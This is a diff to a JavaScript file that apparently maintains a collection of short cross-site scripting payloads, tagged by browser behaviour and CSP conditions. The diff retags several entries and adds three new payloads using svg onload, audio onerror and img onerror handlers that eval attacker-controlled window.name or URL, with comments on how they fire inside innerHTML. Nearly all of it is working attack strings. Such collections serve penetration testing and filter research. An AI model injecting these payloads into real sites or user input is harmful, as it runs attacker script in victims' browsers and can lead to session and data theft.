@@ -15,6 +15,7 @@ const TAGS = {
     chromeOnly: 'chrome-only',
     safariOnly: 'safari-only',
     firefoxInner: 'firefox-innerHTML',
+    chromeInner: 'chrome-innerHTML'
 }
 
 const PAYLOADS = [
@@ -61,17 +62,35 @@ const PAYLOADS = [
 //     },
     {
         html: "<svg/onload=eval(name)>",
-        tags: [TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsName, TAGS.notInner, TAGS.firefoxInner],
+        tags: [TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsName, TAGS.notInner],
         author: null,
     },
     {
         html: "<svg/onload=eval(`'`+URL)>",
-        tags: [TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsURL, TAGS.notInner, TAGS.firefoxInner],
+        tags: [TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsURL, TAGS.notInner],
         author: '@wcbowling'
     },
     {
         html: "<svg/onload=location=name>",
-        tags: [TAGS.unsafeInline, TAGS.controlsName, TAGS.notInner, TAGS.firefoxInner],
+        tags: [TAGS.unsafeInline, TAGS.controlsName, TAGS.notInner],
+        author: null
+    },
+    {
+        html: "<svg><svg/onload=eval(name)>",
+        tags: [TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsName, TAGS.notInner, TAGS.chromeInner],
+        comment: 'Will work inside innerHTML in Chrome',
+        author: ['@ZeddYu_Lu', '@phithon_xg'],
+    },
+    {
+        html: "<audio/src/onerror=eval(name)>",
+        tags: [TAGS.unsafeInline, TAGS.controlsName],
+        comment: 'What is special about this payload is that it will work inside innerHTML on elements not yet inserted into the DOM',
+        author: '@terjanq'
+    },
+    {
+        html: "<img/src/onerror=eval(`'`+URL)>",
+        tags: [TAGS.unsafeInline, TAGS.controlsURL],
+        comment: 'What is special about this payload is that it will work inside innerHTML on elements not yet inserted into the DOM',
         author: null
     },
     {
